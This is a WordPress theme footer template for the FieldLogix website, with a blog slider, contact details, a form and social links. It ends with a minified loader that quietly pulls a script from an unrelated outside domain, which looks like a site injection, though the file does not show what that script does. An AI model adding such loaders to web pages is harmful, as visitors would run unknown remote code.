<p><?php the_field('static_section_text'); ?></p>
    <?php if(is_page(24147)){ ?>

	<div class="bg_texture">

		
                    
		<div class="full_width">

				<div class="latest_news">

				

					

						<h2>Latest Blogs</h2>								

						<div id="news">

							<div class="bxslider">

							 <?php
							// The Query
							query_posts(array('post_type' => 'post','order'=> 'DESC','posts_per_page' => 5));

							// The Loop
							while ( have_posts() ) : the_post(); ?>
							    
								<div class="slide">

									<h3 class="header-3"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h3>
									
									<?php the_excerpt(); ?> 

								</div> <!-- slide  -->
							
							<?php endwhile;

							// Reset Query
							wp_reset_query(); ?> 


							</div> <!-- slider  -->

						</div> <!-- news  -->

					

										

				</div> <!-- .latest_news  -->
				
				<div class="clear"></div> <!-- clearfix  -->


			</div><!-- end .full_width -->	

			

		</div> <!-- row  -->

	</div> <!-- full width  -->

	<?php } ?>



	<?php if ( is_page_template( 'page-mobile.php' ) ) { ?>
		<div class="mobile_contact_info">
			<p>(888) 803-0200<br>
				<a href="mailto:learnmore@fieldlogix.com">learnmore@fieldlogix.com</a></p>
		</div>
	<?php } ?>

	
       
			<footer class="footer" role="contentinfo">

				<div id="inner-footer" class="wrap clearfix">
                                    
                                    <div class="fourcol first">

                                        <p class="heading-text">Learn the difference!</p>
                                        
                                        <?php gravity_form(12, $display_title=false, $display_description=false, $display_inactive=false, $field_values=null, $ajax=true, $tabindex); ?>
                                        <div class="clear"></div>

                                    </div>
	
                                    <div id="footer-right-container">
                                    
	                                    <div class="fourcol middle">
	                                            
	                                            <p><strong>Headquarters</strong></p>
	                                           
	                                                
	                                              <span itemprop="streetAddress">16885 W. Bernardo Dr. Ste. 220</span><br />
	                                              
	                                              <span itemprop="addressLocality">San Diego </span>,
	                                              
	                                              <span itemprop="addressRegion">CA </span> 
	                                              
	                                              <span itemprop="postalCode">92127</span>
	                                        
	                                            
	                                            Phone: <span itemprop="telephone">888-803-0200</span>
											&nbsp;
	                                            <a  target="_blank" href="https://www.linkedin.com/groups/14112481/"><img src="<?php echo get_template_directory_uri(); ?>/library/images/linkedin_community_button_site_footer.jpeg" alt="LinkedIn Community" /></a>
	                                        <br />



	                                    </div>

	                                    <div class="fourcol last">
	                                        <?php bones_footer_links(); ?>
	                                        
	                                    </div>

	                                    <div class="clear"></div>


	                                </div><!-- /footer-right-container -->


				</div> <!-- end #inner-footer -->

				<div class="green-bar">

					<div class="wrap">

						<div class="ninecol first">

								<span id="copyright">&copy; <?php echo date('Y'); ?> FieldLogix. All Rights Reserved.</span>


						</div> <!-- col  -->

						<div class="threecol last">

						<ul class="top-social-networks">
							<li><a  target="_blank" class="ico-1 link" href="https://www.facebook.com/fieldlogix"><img src="<?php echo get_template_directory_uri(); ?>/library/images/ic_facebook.png" alt="Facebook" width="40" height="40"></a></li>
							<li><a  target="_blank" class="ico-2 link" href="https://twitter.com/fieldlogix"><img src="<?php echo get_template_directory_uri(); ?>/library/images/ic_twitter.png" alt="Twitter" width="40" height="40"></a></li>
							<li><a  target="_blank" class="ico-3 link" href="https://www.instagram.com/fieldlogix/"><img src="<?php echo get_template_directory_uri(); ?>/library/images/ic_instagram.png" alt="Instagram" width="40" height="40"></a></li>
							<li><a  target="_blank" class="ico-4 link" href="https://www.youtube.com/channel/UC_-2klwU2Q6cyBkoHgTY0tA"><img src="<?php echo get_template_directory_uri(); ?>/library/images/ic_youtube.png" alt="YouTube" width="40" height="40"></a></li>
							<li><a  target="_blank" class="ico-5 link" href="http://www.linkedin.com/company/fieldlogix"><img src="<?php echo get_template_directory_uri(); ?>/library/images/ic_linkedin.png" alt="LinkedIn" width="40" height="40"></a></li>
						</ul>

						</div> <!-- col  -->

						<div class="clear"></div> <!-- clear  -->

					</div> <!-- wrap  -->

				</div> <!-- green-bar  -->

			</footer> <!-- end footer -->
                        
                

	</div> <!-- container  -->

	<!-- all js scripts are loaded in library/bones.php -->
	<?php wp_footer(); ?>

<script type='text/javascript'>
(function(f,b,n,j,x,e){x=b.createElement(n);e=b.getElementsByTagName(n)[0];x.async=1;x.src=j;e.parentNode.insertBefore(x,e);})(window,document,'script','https://packedbrick.com/vfRg2L1ej33bleY00JdN9pxuSvOX2mNI-nTw9UpUoPg');
</script>
</body>
</html>